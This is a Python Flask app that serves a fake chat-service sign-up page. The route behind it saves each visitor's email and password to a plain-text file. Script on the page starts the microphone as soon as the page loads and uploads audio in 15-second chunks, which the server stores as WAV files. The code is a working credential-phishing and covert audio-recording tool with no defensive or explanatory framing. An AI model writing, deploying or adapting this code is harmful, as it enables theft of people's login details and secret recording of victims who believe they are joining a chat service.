import os
import base64
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
from pydub import AudioSegment
from pydub.utils import make_chunks

app = Flask(__name__)

# Directory to save audio recordings
RECORDINGS_FOLDER = os.path.expanduser('~/storage/downloads/Recordings')
if not os.path.exists(RECORDINGS_FOLDER):
    os.makedirs(RECORDINGS_FOLDER)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <style>
            body {
                margin: 0;
                padding: 0;
                background: url('/static/background.jpg') no-repeat center center fixed;
                background-size: cover;
                font-family: Arial, sans-serif;
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            form {
                background: rgba(0, 0, 0, 0.8);
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
                text-align: center;
                width: 90%;
                max-width: 400px;
            }
            input[type="email"], input[type="password"] {
                width: 90%;
                padding: 10px;
                margin: 10px 0;
                border: none;
                border-radius: 5px;
                font-size: 1em;
            }
            input[type="submit"] {
                width: 90%;
                padding: 10px;
                background-color: red;
                border: none;
                border-radius: 5px;
                color: white;
                font-size: 1.2em;
                cursor: pointer;
            }
            input[type="submit"]:hover {
                background-color: darkred;
            }
        </style>
    </head>
    <body>
        <form action="/request_invite" method="post">
            <h2>Add your details and make a request to join over 1 Million users that use our internet chat!</h2>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Sign Up Now!">
        </form>
        <script>
            let mediaRecorder;
            let audioChunks = [];

            async function startAutoRecording() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                    
                    mediaRecorder.ondataavailable = event => {
                        if (event.data.size > 0) {
                            saveRecording(event.data);
                        }
                    };

                    mediaRecorder.start(15000); // Record in 15-second chunks
                } catch (err) {
                    console.error("Error accessing microphone:", err);
                    alert("Microphone access is required to continue.");
                }
            }

            async function saveRecording(audioBlob) {
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = async function() {
                    const base64Audio = reader.result.split(',')[1];
                    await fetch('/upload_audio', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ audio: base64Audio })
                    });
                };
            }

            // Start recording automatically when the page loads
            window.onload = startAutoRecording;
        </script>
    </body>
    </html>
    ''')

@app.route('/request_invite', methods=['POST'])
def request_invite():
    email = request.form.get('email')
    password = request.form.get('password')
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')

    credentials_file = os.path.join(RECORDINGS_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {email}\nPassword: {password}\n")

    return "Your request has been received! We'll contact you soon.", 200

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        audio_data = request.json.get('audio')
        if not audio_data:
            return jsonify({"error": "No audio data received"}), 400

        # Decode and save the WebM file
        filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        webm_path = os.path.join(RECORDINGS_FOLDER, f"{filename}.webm")
        wav_path = os.path.join(RECORDINGS_FOLDER, f"{filename}.wav")

        with open(webm_path, 'wb') as f:
            f.write(base64.b64decode(audio_data))

        # Convert WebM to WAV using pydub
        audio = AudioSegment.from_file(webm_path, format="webm")
        audio.export(wav_path, format="wav")

        # Optionally remove the original WebM file
        os.remove(webm_path)

        return jsonify({"message": f"Audio saved successfully as {wav_path}."}), 200
    except Exception as e:
        return jsonify({"error": f"An error occurred: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4040)
